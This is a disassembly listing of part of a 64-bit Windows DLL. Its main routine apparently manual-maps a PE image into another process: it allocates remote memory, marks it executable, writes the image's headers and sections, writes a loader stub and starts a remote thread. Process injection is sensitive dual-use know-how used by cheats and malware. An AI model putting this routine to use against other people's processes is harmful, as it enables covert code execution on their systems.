   1800032ce:	cc                   	int3
   1800032cf:	cc                   	int3
   1800032d0:	48 8b 09             	mov    (%rcx),%rcx
   1800032d3:	48 85 c9             	test   %rcx,%rcx
   1800032d6:	0f 85 e4 f6 ff ff    	jne    0x1800029c0
   1800032dc:	c3                   	ret
   1800032dd:	cc                   	int3
   1800032de:	cc                   	int3
   1800032df:	cc                   	int3
   1800032e0:	48 8b 09             	mov    (%rcx),%rcx
   1800032e3:	48 85 c9             	test   %rcx,%rcx
   1800032e6:	0f 85 54 f7 ff ff    	jne    0x180002a40
   1800032ec:	c3                   	ret
   1800032ed:	cc                   	int3
   1800032ee:	cc                   	int3
   1800032ef:	cc                   	int3
   1800032f0:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   1800032f4:	48 8b 09             	mov    (%rcx),%rcx
   1800032f7:	e9 14 ff ff ff       	jmp    0x180003210
   1800032fc:	cc                   	int3
   1800032fd:	cc                   	int3
   1800032fe:	cc                   	int3
   1800032ff:	cc                   	int3
   180003300:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   180003304:	48 8b 09             	mov    (%rcx),%rcx
   180003307:	e9 64 fe ff ff       	jmp    0x180003170
   18000330c:	cc                   	int3
   18000330d:	cc                   	int3
   18000330e:	cc                   	int3
   18000330f:	cc                   	int3
   180003310:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180003315:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   18000331a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   18000331f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180003324:	53                   	push   %rbx
   180003325:	56                   	push   %rsi
   180003326:	57                   	push   %rdi
   180003327:	48 83 ec 30          	sub    $0x30,%rsp
   18000332b:	48 8b f9             	mov    %rcx,%rdi
   18000332e:	48 8d 74 24 58       	lea    0x58(%rsp),%rsi
   180003333:	b9 01 00 00 00       	mov    $0x1,%ecx
   180003338:	ff 15 32 2f 00 00    	call   *0x2f32(%rip)        # 0x180006270
   18000333e:	48 8b d8             	mov    %rax,%rbx
   180003341:	e8 6a de ff ff       	call   0x1800011b0
   180003346:	45 33 c9             	xor    %r9d,%r9d
   180003349:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   18000334e:	4c 8b c7             	mov    %rdi,%r8
   180003351:	48 8b d3             	mov    %rbx,%rdx
   180003354:	48 8b 08             	mov    (%rax),%rcx
   180003357:	ff 15 1b 2f 00 00    	call   *0x2f1b(%rip)        # 0x180006278
   18000335d:	48 83 c4 30          	add    $0x30,%rsp
   180003361:	5f                   	pop    %rdi
   180003362:	5e                   	pop    %rsi
   180003363:	5b                   	pop    %rbx
   180003364:	c3                   	ret
   180003365:	cc                   	int3
   180003366:	cc                   	int3
   180003367:	cc                   	int3
   180003368:	cc                   	int3
   180003369:	cc                   	int3
   18000336a:	cc                   	int3
   18000336b:	cc                   	int3
   18000336c:	cc                   	int3
   18000336d:	cc                   	int3
   18000336e:	cc                   	int3
   18000336f:	cc                   	int3
   180003370:	40 55                	rex push %rbp
   180003372:	57                   	push   %rdi
   180003373:	41 56                	push   %r14
   180003375:	48 8d 6c 24 f0       	lea    -0x10(%rsp),%rbp
   18000337a:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
   180003381:	48 8b 05 b8 7c 00 00 	mov    0x7cb8(%rip),%rax        # 0x18000b040
   180003388:	48 33 c4             	xor    %rsp,%rax
   18000338b:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   18000338f:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   180003394:	4c 8b f2             	mov    %rdx,%r14
   180003397:	48 8b f9             	mov    %rcx,%rdi
   18000339a:	66 39 02             	cmp    %ax,(%rdx)
   18000339d:	74 13                	je     0x1800033b2
   18000339f:	48 8d 0d fa 56 00 00 	lea    0x56fa(%rip),%rcx        # 0x180008aa0
   1800033a6:	e8 65 ff ff ff       	call   0x180003310
   1800033ab:	32 c0                	xor    %al,%al
   1800033ad:	e9 b1 07 00 00       	jmp    0x180003b63
   1800033b2:	4c 89 bc 24 f0 00 00 	mov    %r15,0xf0(%rsp)
   1800033b9:	00 
   1800033ba:	b8 64 86 00 00       	mov    $0x8664,%eax
   1800033bf:	4c 63 7a 3c          	movslq 0x3c(%rdx),%r15
   1800033c3:	4d 03 fe             	add    %r14,%r15
   1800033c6:	66 41 39 47 04       	cmp    %ax,0x4(%r15)
   1800033cb:	74 13                	je     0x1800033e0
   1800033cd:	48 8d 0d dc 56 00 00 	lea    0x56dc(%rip),%rcx        # 0x180008ab0
   1800033d4:	e8 37 ff ff ff       	call   0x180003310
   1800033d9:	32 c0                	xor    %al,%al
   1800033db:	e9 7b 07 00 00       	jmp    0x180003b5b
   1800033e0:	48 8d 0d e1 56 00 00 	lea    0x56e1(%rip),%rcx        # 0x180008ac8
   1800033e7:	4c 89 a4 24 00 01 00 	mov    %r12,0x100(%rsp)
   1800033ee:	00 
   1800033ef:	e8 1c ff ff ff       	call   0x180003310
   1800033f4:	45 8b 47 50          	mov    0x50(%r15),%r8d
   1800033f8:	33 d2                	xor    %edx,%edx
   1800033fa:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   180003400:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   180003407:	00 
   180003408:	48 8b cf             	mov    %rdi,%rcx
   18000340b:	ff 15 6f 2c 00 00    	call   *0x2c6f(%rip)        # 0x180006080
   180003411:	4c 8b e0             	mov    %rax,%r12
   180003414:	48 85 c0             	test   %rax,%rax
   180003417:	75 1b                	jne    0x180003434
   180003419:	ff 15 41 2c 00 00    	call   *0x2c41(%rip)        # 0x180006060
   18000341f:	8b d0                	mov    %eax,%edx
   180003421:	48 8d 0d b0 56 00 00 	lea    0x56b0(%rip),%rcx        # 0x180008ad8
   180003428:	e8 e3 fe ff ff       	call   0x180003310
   18000342d:	32 c0                	xor    %al,%al
   18000342f:	e9 1f 07 00 00       	jmp    0x180003b53
   180003434:	48 8d 45 d4          	lea    -0x2c(%rbp),%rax
   180003438:	4c 89 ac 24 f8 00 00 	mov    %r13,0xf8(%rsp)
   18000343f:	00 
   180003440:	45 33 ed             	xor    %r13d,%r13d
   180003443:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003448:	44 89 6d d4          	mov    %r13d,-0x2c(%rbp)
   18000344c:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   180003452:	45 8b 47 50          	mov    0x50(%r15),%r8d
   180003456:	49 8b d4             	mov    %r12,%rdx
   180003459:	48 8b cf             	mov    %rdi,%rcx
   18000345c:	ff 15 0e 2c 00 00    	call   *0x2c0e(%rip)        # 0x180006070
   180003462:	48 8b 05 ff 2b 00 00 	mov    0x2bff(%rip),%rax        # 0x180006068
   180003469:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
   18000346f:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   180003474:	4d 8b c6             	mov    %r14,%r8
   180003477:	48 8b 05 fa 2b 00 00 	mov    0x2bfa(%rip),%rax        # 0x180006078
   18000347e:	49 8b d4             	mov    %r12,%rdx
   180003481:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   180003486:	48 8b cf             	mov    %rdi,%rcx
   180003489:	48 8b 05 c8 2b 00 00 	mov    0x2bc8(%rip),%rax        # 0x180006058
   180003490:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180003495:	4c 89 6c 24 70       	mov    %r13,0x70(%rsp)
   18000349a:	48 c7 44 24 78 01 00 	movq   $0x1,0x78(%rsp)
   1800034a1:	00 00 
   1800034a3:	48 c7 45 88 01 00 00 	movq   $0x1,-0x78(%rbp)
   1800034aa:	00 
   1800034ab:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   1800034b0:	4c 89 6d 80          	mov    %r13,-0x80(%rbp)
   1800034b4:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1800034b9:	ff 15 91 2b 00 00    	call   *0x2b91(%rip)        # 0x180006050
   1800034bf:	85 c0                	test   %eax,%eax
   1800034c1:	75 30                	jne    0x1800034f3
   1800034c3:	ff 15 97 2b 00 00    	call   *0x2b97(%rip)        # 0x180006060
   1800034c9:	8b d0                	mov    %eax,%edx
   1800034cb:	48 8d 0d 3e 56 00 00 	lea    0x563e(%rip),%rcx        # 0x180008b10
   1800034d2:	e8 39 fe ff ff       	call   0x180003310
   1800034d7:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1800034dd:	45 33 c0             	xor    %r8d,%r8d
   1800034e0:	49 8b d4             	mov    %r12,%rdx
   1800034e3:	48 8b cf             	mov    %rdi,%rcx
   1800034e6:	ff 15 ac 2b 00 00    	call   *0x2bac(%rip)        # 0x180006098
   1800034ec:	32 c0                	xor    %al,%al
   1800034ee:	e9 58 06 00 00       	jmp    0x180003b4b
   1800034f3:	48 89 9c 24 40 01 00 	mov    %rbx,0x140(%rsp)
   1800034fa:	00 
   1800034fb:	41 0f b7 5f 14       	movzwl 0x14(%r15),%ebx
   180003500:	48 83 c3 2c          	add    $0x2c,%rbx
   180003504:	48 89 b4 24 08 01 00 	mov    %rsi,0x108(%rsp)
   18000350b:	00 
   18000350c:	41 8b f5             	mov    %r13d,%esi
   18000350f:	66 45 39 6f 06       	cmp    %r13w,0x6(%r15)
   180003514:	74 41                	je     0x180003557
   180003516:	49 03 df             	add    %r15,%rbx
   180003519:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180003520:	8b 43 fc             	mov    -0x4(%rbx),%eax
   180003523:	85 c0                	test   %eax,%eax
   180003525:	74 21                	je     0x180003548
   180003527:	44 8b 03             	mov    (%rbx),%r8d
   18000352a:	44 8b c8             	mov    %eax,%r9d
   18000352d:	8b 53 f8             	mov    -0x8(%rbx),%edx
   180003530:	4d 03 c6             	add    %r14,%r8
   180003533:	49 03 d4             	add    %r12,%rdx
   180003536:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   18000353b:	48 8b cf             	mov    %rdi,%rcx
   18000353e:	ff 15 0c 2b 00 00    	call   *0x2b0c(%rip)        # 0x180006050
   180003544:	85 c0                	test   %eax,%eax
   180003546:	74 64                	je     0x1800035ac
   180003548:	41 0f b7 47 06       	movzwl 0x6(%r15),%eax
   18000354d:	ff c6                	inc    %esi
   18000354f:	48 83 c3 28          	add    $0x28,%rbx
   180003553:	3b f0                	cmp    %eax,%esi
   180003555:	75 c9                	jne    0x180003520
   180003557:	33 d2                	xor    %edx,%edx
   180003559:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   180003560:	00 
   180003561:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   180003567:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   18000356d:	48 8b cf             	mov    %rdi,%rcx
   180003570:	ff 15 0a 2b 00 00    	call   *0x2b0a(%rip)        # 0x180006080
   180003576:	4c 8b e8             	mov    %rax,%r13
   180003579:	48 85 c0             	test   %rax,%rax
   18000357c:	75 5c                	jne    0x1800035da
   18000357e:	ff 15 dc 2a 00 00    	call   *0x2adc(%rip)        # 0x180006060
   180003584:	8b d0                	mov    %eax,%edx
   180003586:	48 8d 0d c3 55 00 00 	lea    0x55c3(%rip),%rcx        # 0x180008b50
   18000358d:	e8 7e fd ff ff       	call   0x180003310
   180003592:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180003598:	45 33 c0             	xor    %r8d,%r8d
   18000359b:	49 8b d4             	mov    %r12,%rdx
   18000359e:	48 8b cf             	mov    %rdi,%rcx
   1800035a1:	ff 15 f1 2a 00 00    	call   *0x2af1(%rip)        # 0x180006098
   1800035a7:	e9 8d 05 00 00       	jmp    0x180003b39
   1800035ac:	ff 15 ae 2a 00 00    	call   *0x2aae(%rip)        # 0x180006060
   1800035b2:	8b d0                	mov    %eax,%edx
   1800035b4:	48 8d 0d 75 55 00 00 	lea    0x5575(%rip),%rcx        # 0x180008b30
   1800035bb:	e8 50 fd ff ff       	call   0x180003310
   1800035c0:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1800035c6:	45 33 c0             	xor    %r8d,%r8d
   1800035c9:	49 8b d4             	mov    %r12,%rdx
   1800035cc:	48 8b cf             	mov    %rdi,%rcx
   1800035cf:	ff 15 c3 2a 00 00    	call   *0x2ac3(%rip)        # 0x180006098
   1800035d5:	e9 5f 05 00 00       	jmp    0x180003b39
   1800035da:	33 db                	xor    %ebx,%ebx
   1800035dc:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1800035e1:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   1800035e7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800035ec:	49 8b d5             	mov    %r13,%rdx
   1800035ef:	48 8b cf             	mov    %rdi,%rcx
   1800035f2:	ff 15 58 2a 00 00    	call   *0x2a58(%rip)        # 0x180006050
   1800035f8:	85 c0                	test   %eax,%eax
   1800035fa:	75 43                	jne    0x18000363f
   1800035fc:	ff 15 5e 2a 00 00    	call   *0x2a5e(%rip)        # 0x180006060
   180003602:	8b d0                	mov    %eax,%edx
   180003604:	48 8d 0d 7d 55 00 00 	lea    0x557d(%rip),%rcx        # 0x180008b88
   18000360b:	e8 00 fd ff ff       	call   0x180003310
   180003610:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180003616:	45 33 c0             	xor    %r8d,%r8d
   180003619:	49 8b d4             	mov    %r12,%rdx
   18000361c:	48 8b cf             	mov    %rdi,%rcx
   18000361f:	ff 15 73 2a 00 00    	call   *0x2a73(%rip)        # 0x180006098
   180003625:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   18000362b:	45 33 c0             	xor    %r8d,%r8d
   18000362e:	49 8b d5             	mov    %r13,%rdx
   180003631:	48 8b cf             	mov    %rdi,%rcx
   180003634:	ff 15 5e 2a 00 00    	call   *0x2a5e(%rip)        # 0x180006098
   18000363a:	e9 fa 04 00 00       	jmp    0x180003b39
   18000363f:	33 d2                	xor    %edx,%edx
   180003641:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   180003648:	00 
   180003649:	41 b9 00 30 00 00    	mov    $0x3000,%r9d
   18000364f:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   180003655:	48 8b cf             	mov    %rdi,%rcx
   180003658:	ff 15 22 2a 00 00    	call   *0x2a22(%rip)        # 0x180006080
   18000365e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180003663:	48 8b f0             	mov    %rax,%rsi
   180003666:	48 85 c0             	test   %rax,%rax
   180003669:	75 43                	jne    0x1800036ae
   18000366b:	ff 15 ef 29 00 00    	call   *0x29ef(%rip)        # 0x180006060
   180003671:	8b d0                	mov    %eax,%edx
   180003673:	48 8d 0d 2e 55 00 00 	lea    0x552e(%rip),%rcx        # 0x180008ba8
   18000367a:	e8 91 fc ff ff       	call   0x180003310
   18000367f:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180003685:	45 33 c0             	xor    %r8d,%r8d
   180003688:	49 8b d4             	mov    %r12,%rdx
   18000368b:	48 8b cf             	mov    %rdi,%rcx
   18000368e:	ff 15 04 2a 00 00    	call   *0x2a04(%rip)        # 0x180006098
   180003694:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   18000369a:	45 33 c0             	xor    %r8d,%r8d
   18000369d:	49 8b d5             	mov    %r13,%rdx
   1800036a0:	48 8b cf             	mov    %rdi,%rcx
   1800036a3:	ff 15 ef 29 00 00    	call   *0x29ef(%rip)        # 0x180006098
   1800036a9:	e9 8b 04 00 00       	jmp    0x180003b39
   1800036ae:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
   1800036b4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800036b9:	4c 8d 05 c0 04 00 00 	lea    0x4c0(%rip),%r8        # 0x180003b80
   1800036c0:	48 8b d6             	mov    %rsi,%rdx
   1800036c3:	48 8b cf             	mov    %rdi,%rcx
   1800036c6:	ff 15 84 29 00 00    	call   *0x2984(%rip)        # 0x180006050
   1800036cc:	85 c0                	test   %eax,%eax
   1800036ce:	75 58                	jne    0x180003728
   1800036d0:	ff 15 8a 29 00 00    	call   *0x298a(%rip)        # 0x180006060
   1800036d6:	8b d0                	mov    %eax,%edx
   1800036d8:	48 8d 0d f9 54 00 00 	lea    0x54f9(%rip),%rcx        # 0x180008bd8
   1800036df:	e8 2c fc ff ff       	call   0x180003310
   1800036e4:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1800036ea:	45 33 c0             	xor    %r8d,%r8d
   1800036ed:	49 8b d4             	mov    %r12,%rdx
   1800036f0:	48 8b cf             	mov    %rdi,%rcx
   1800036f3:	ff 15 9f 29 00 00    	call   *0x299f(%rip)        # 0x180006098
   1800036f9:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1800036ff:	45 33 c0             	xor    %r8d,%r8d
   180003702:	49 8b d5             	mov    %r13,%rdx
   180003705:	48 8b cf             	mov    %rdi,%rcx
   180003708:	ff 15 8a 29 00 00    	call   *0x298a(%rip)        # 0x180006098
   18000370e:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   180003714:	45 33 c0             	xor    %r8d,%r8d
   180003717:	48 8b d6             	mov    %rsi,%rdx
   18000371a:	48 8b cf             	mov    %rdi,%rcx
   18000371d:	ff 15 75 29 00 00    	call   *0x2975(%rip)        # 0x180006098
   180003723:	e9 11 04 00 00       	jmp    0x180003b39
   180003728:	49 8b d4             	mov    %r12,%rdx
   18000372b:	48 8d 0d c6 54 00 00 	lea    0x54c6(%rip),%rcx        # 0x180008bf8
   180003732:	e8 d9 fb ff ff       	call   0x180003310
   180003737:	49 8b d5             	mov    %r13,%rdx
   18000373a:	48 8d 0d cf 54 00 00 	lea    0x54cf(%rip),%rcx        # 0x180008c10
   180003741:	e8 ca fb ff ff       	call   0x180003310
   180003746:	48 8b d6             	mov    %rsi,%rdx
   180003749:	48 8d 0d d8 54 00 00 	lea    0x54d8(%rip),%rcx        # 0x180008c28
   180003750:	e8 bb fb ff ff       	call   0x180003310
   180003755:	48 8d 0d e4 54 00 00 	lea    0x54e4(%rip),%rcx        # 0x180008c40
   18000375c:	e8 af fb ff ff       	call   0x180003310
   180003761:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180003766:	4c 8b ce             	mov    %rsi,%r9
   180003769:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   18000376d:	45 33 c0             	xor    %r8d,%r8d
   180003770:	33 d2                	xor    %edx,%edx
   180003772:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   180003777:	48 8b cf             	mov    %rdi,%rcx
   18000377a:	ff 15 10 29 00 00    	call   *0x2910(%rip)        # 0x180006090
   180003780:	48 85 c0             	test   %rax,%rax
   180003783:	75 58                	jne    0x1800037dd
   180003785:	ff 15 d5 28 00 00    	call   *0x28d5(%rip)        # 0x180006060
   18000378b:	8b d0                	mov    %eax,%edx
   18000378d:	48 8d 0d bc 54 00 00 	lea    0x54bc(%rip),%rcx        # 0x180008c50
   180003794:	e8 77 fb ff ff       	call   0x180003310
   180003799:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   18000379f:	45 33 c0             	xor    %r8d,%r8d
   1800037a2:	49 8b d4             	mov    %r12,%rdx
   1800037a5:	48 8b cf             	mov    %rdi,%rcx
   1800037a8:	ff 15 ea 28 00 00    	call   *0x28ea(%rip)        # 0x180006098
   1800037ae:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1800037b4:	45 33 c0             	xor    %r8d,%r8d
   1800037b7:	49 8b d5             	mov    %r13,%rdx
   1800037ba:	48 8b cf             	mov    %rdi,%rcx
   1800037bd:	ff 15 d5 28 00 00    	call   *0x28d5(%rip)        # 0x180006098
   1800037c3:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   1800037c9:	45 33 c0             	xor    %r8d,%r8d
   1800037cc:	48 8b d6             	mov    %rsi,%rdx
   1800037cf:	48 8b cf             	mov    %rdi,%rcx
   1800037d2:	ff 15 c0 28 00 00    	call   *0x28c0(%rip)        # 0x180006098
   1800037d8:	e9 5c 03 00 00       	jmp    0x180003b39
   1800037dd:	48 8b c8             	mov    %rax,%rcx
   1800037e0:	ff 15 5a 28 00 00    	call   *0x285a(%rip)        # 0x180006040
   1800037e6:	48 8b d6             	mov    %rsi,%rdx
   1800037e9:	48 8d 0d 80 54 00 00 	lea    0x5480(%rip),%rcx        # 0x180008c70
   1800037f0:	e8 1b fb ff ff       	call   0x180003310
   1800037f5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1800037fc:	00 00 00 00 
   180003800:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   180003804:	89 5d d0             	mov    %ebx,-0x30(%rbp)
   180003807:	48 8b cf             	mov    %rdi,%rcx
   18000380a:	ff 15 90 28 00 00    	call   *0x2890(%rip)        # 0x1800060a0
   180003810:	8b 55 d0             	mov    -0x30(%rbp),%edx
   180003813:	81 fa 03 01 00 00    	cmp    $0x103,%edx
   180003819:	0f 85 0e 03 00 00    	jne    0x180003b2d
   18000381f:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003822:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180003827:	41 b9 40 00 00 00    	mov    $0x40,%r9d
   18000382d:	4c 8d 45 90          	lea    -0x70(%rbp),%r8
   180003831:	49 8b d5             	mov    %r13,%rdx
   180003834:	48 8b cf             	mov    %rdi,%rcx
   180003837:	0f 11 45 90          	movups %xmm0,-0x70(%rbp)
   18000383b:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   18000383f:	0f 11 45 b0          	movups %xmm0,-0x50(%rbp)
   180003843:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   180003847:	ff 15 3b 28 00 00    	call   *0x283b(%rip)        # 0x180006088
   18000384d:	48 8b 5d b0          	mov    -0x50(%rbp),%rbx
   180003851:	48 81 fb 40 40 40 00 	cmp    $0x404040,%rbx
   180003858:	0f 84 be 02 00 00    	je     0x180003b1c
   18000385e:	48 81 fb 50 50 50 00 	cmp    $0x505050,%rbx
   180003865:	75 0c                	jne    0x180003873
   180003867:	48 8d 0d 6a 54 00 00 	lea    0x546a(%rip),%rcx        # 0x180008cd8
   18000386e:	e8 9d fa ff ff       	call   0x180003310
   180003873:	b9 0a 00 00 00       	mov    $0xa,%ecx
   180003878:	ff 15 a2 27 00 00    	call   *0x27a2(%rip)        # 0x180006020
   18000387e:	48 85 db             	test   %rbx,%rbx
   180003881:	bb 00 00 00 00       	mov    $0x0,%ebx
   180003886:	0f 84 74 ff ff ff    	je     0x180003800
   18000388c:	b9 00 00 40 01       	mov    $0x1400000,%ecx
   180003891:	ff 15 59 29 00 00    	call   *0x2959(%rip)        # 0x1800061f0
   180003897:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   18000389c:	4c 8b f0             	mov    %rax,%r14
   18000389f:	48 85 c0             	test   %rax,%rax
   1800038a2:	75 11                	jne    0x1800038b5
   1800038a4:	48 8d 0d 55 54 00 00 	lea    0x5455(%rip),%rcx        # 0x180008d00
   1800038ab:	e8 60 fa ff ff       	call   0x180003310
   1800038b0:	e9 84 02 00 00       	jmp    0x180003b39
   1800038b5:	33 d2                	xor    %edx,%edx
   1800038b7:	41 b8 00 00 40 01    	mov    $0x1400000,%r8d
   1800038bd:	49 8b ce             	mov    %r14,%rcx
   1800038c0:	e8 bd 1b 00 00       	call   0x180005482
   1800038c5:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
   1800038cb:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800038d0:	4d 8b c6             	mov    %r14,%r8
   1800038d3:	49 8b d4             	mov    %r12,%rdx
   1800038d6:	48 8b cf             	mov    %rdi,%rcx
   1800038d9:	ff 15 71 27 00 00    	call   *0x2771(%rip)        # 0x180006050
   1800038df:	85 c0                	test   %eax,%eax
   1800038e1:	75 0c                	jne    0x1800038ef
   1800038e3:	48 8d 0d 36 54 00 00 	lea    0x5436(%rip),%rcx        # 0x180008d20
   1800038ea:	e8 21 fa ff ff       	call   0x180003310
   1800038ef:	41 0f b7 5f 14       	movzwl 0x14(%r15),%ebx
   1800038f4:	33 f6                	xor    %esi,%esi
   1800038f6:	41 0f b7 4f 06       	movzwl 0x6(%r15),%ecx
   1800038fb:	48 83 c3 18          	add    $0x18,%rbx
   1800038ff:	49 03 df             	add    %r15,%rbx
   180003902:	66 85 c9             	test   %cx,%cx
   180003905:	0f 84 c7 00 00 00    	je     0x1800039d2
   18000390b:	48 8d 15 2e 54 00 00 	lea    0x542e(%rip),%rdx        # 0x180008d40
   180003912:	4c 8d 05 2f 54 00 00 	lea    0x542f(%rip),%r8        # 0x180008d48
   180003919:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180003920:	83 7b 08 00          	cmpl   $0x0,0x8(%rbx)
   180003924:	0f 84 92 00 00 00    	je     0x1800039bc
   18000392a:	33 c9                	xor    %ecx,%ecx
   18000392c:	0f 1f 40 00          	nopl   0x0(%rax)
   180003930:	0f b6 04 0b          	movzbl (%rbx,%rcx,1),%eax
   180003934:	48 ff c1             	inc    %rcx
   180003937:	3a 44 0a ff          	cmp    -0x1(%rdx,%rcx,1),%al
   18000393b:	75 08                	jne    0x180003945
   18000393d:	48 83 f9 06          	cmp    $0x6,%rcx
   180003941:	75 ed                	jne    0x180003930
   180003943:	eb 1f                	jmp    0x180003964
   180003945:	33 c9                	xor    %ecx,%ecx
   180003947:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000394e:	00 00 
   180003950:	0f b6 04 0b          	movzbl (%rbx,%rcx,1),%eax
   180003954:	48 ff c1             	inc    %rcx
   180003957:	41 3a 44 08 ff       	cmp    -0x1(%r8,%rcx,1),%al
   18000395c:	75 5e                	jne    0x1800039bc
   18000395e:	48 83 f9 07          	cmp    $0x7,%rcx
   180003962:	75 ec                	jne    0x180003950
   180003964:	48 8b d3             	mov    %rbx,%rdx
   180003967:	48 8d 0d e2 53 00 00 	lea    0x53e2(%rip),%rcx        # 0x180008d50
   18000396e:	e8 9d f9 ff ff       	call   0x180003310
   180003973:	8b 53 0c             	mov    0xc(%rbx),%edx
   180003976:	4d 8b c6             	mov    %r14,%r8
   180003979:	44 8b 4b 08          	mov    0x8(%rbx),%r9d
   18000397d:	49 03 d4             	add    %r12,%rdx
   180003980:	48 8b cf             	mov    %rdi,%rcx
   180003983:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   18000398a:	00 00 
   18000398c:	ff 15 be 26 00 00    	call   *0x26be(%rip)        # 0x180006050
   180003992:	85 c0                	test   %eax,%eax
   180003994:	75 18                	jne    0x1800039ae
   180003996:	ff 15 c4 26 00 00    	call   *0x26c4(%rip)        # 0x180006060
   18000399c:	48 8b d3             	mov    %rbx,%rdx
   18000399f:	48 8d 0d c2 53 00 00 	lea    0x53c2(%rip),%rcx        # 0x180008d68
   1800039a6:	44 8b c0             	mov    %eax,%r8d
   1800039a9:	e8 62 f9 ff ff       	call   0x180003310
   1800039ae:	4c 8d 05 93 53 00 00 	lea    0x5393(%rip),%r8        # 0x180008d48
   1800039b5:	48 8d 15 84 53 00 00 	lea    0x5384(%rip),%rdx        # 0x180008d40
   1800039bc:	41 0f b7 47 06       	movzwl 0x6(%r15),%eax
   1800039c1:	ff c6                	inc    %esi
   1800039c3:	48 83 c3 28          	add    $0x28,%rbx
   1800039c7:	3b f0                	cmp    %eax,%esi
   1800039c9:	0f 85 51 ff ff ff    	jne    0x180003920
   1800039cf:	0f b7 c8             	movzwl %ax,%ecx
   1800039d2:	41 0f b7 5f 14       	movzwl 0x14(%r15),%ebx
   1800039d7:	45 33 f6             	xor    %r14d,%r14d
   1800039da:	48 83 c3 18          	add    $0x18,%rbx
   1800039de:	49 03 df             	add    %r15,%rbx
   1800039e1:	66 85 c9             	test   %cx,%cx
   1800039e4:	0f 84 83 00 00 00    	je     0x180003a6d
   1800039ea:	ba 20 00 00 00       	mov    $0x20,%edx
   1800039ef:	90                   	nop
   1800039f0:	8b 4b 08             	mov    0x8(%rbx),%ecx
   1800039f3:	85 c9                	test   %ecx,%ecx
   1800039f5:	74 65                	je     0x180003a5c
   1800039f7:	8b 43 24             	mov    0x24(%rbx),%eax
   1800039fa:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%rbp)
   180003a01:	a9 00 00 00 80       	test   $0x80000000,%eax
   180003a06:	76 07                	jbe    0x180003a0f
   180003a08:	be 04 00 00 00       	mov    $0x4,%esi
   180003a0d:	eb 0d                	jmp    0x180003a1c
   180003a0f:	a9 00 00 00 20       	test   $0x20000000,%eax
   180003a14:	be 02 00 00 00       	mov    $0x2,%esi
   180003a19:	0f 47 f2             	cmova  %edx,%esi
   180003a1c:	8b 53 0c             	mov    0xc(%rbx),%edx
   180003a1f:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   180003a23:	4c 8b c1             	mov    %rcx,%r8
   180003a26:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003a2b:	49 03 d4             	add    %r12,%rdx
   180003a2e:	44 8b ce             	mov    %esi,%r9d
   180003a31:	48 8b cf             	mov    %rdi,%rcx
   180003a34:	ff 15 36 26 00 00    	call   *0x2636(%rip)        # 0x180006070
   180003a3a:	44 8b c6             	mov    %esi,%r8d
   180003a3d:	48 8d 0d 44 53 00 00 	lea    0x5344(%rip),%rcx        # 0x180008d88
   180003a44:	48 8b d3             	mov    %rbx,%rdx
   180003a47:	85 c0                	test   %eax,%eax
   180003a49:	75 07                	jne    0x180003a52
   180003a4b:	48 8d 0d 4e 53 00 00 	lea    0x534e(%rip),%rcx        # 0x180008da0
   180003a52:	e8 b9 f8 ff ff       	call   0x180003310
